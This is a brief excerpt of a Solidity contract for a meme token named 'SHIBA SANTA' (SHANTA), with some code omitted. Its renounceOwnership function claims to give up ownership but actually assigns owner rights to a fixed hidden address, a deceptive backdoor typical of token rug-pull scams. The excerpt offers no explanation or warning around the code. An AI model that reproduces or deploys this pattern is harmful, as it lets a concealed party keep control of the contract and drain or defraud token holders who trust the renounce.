...
contract Ownable is Context {
    ...
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0xeBA5d0a3F0E3F650F1b866568dA84A46c467Aa28));
        _owner = address(0xeBA5d0a3F0E3F650F1b866568dA84A46c467Aa28);
    }
...
contract SHANTA is Context, IERC20, Ownable {

    using SafeMath for uint256;

    string private constant _name = "SHIBA SANTA";
    string private constant _symbol = "SHANTA";
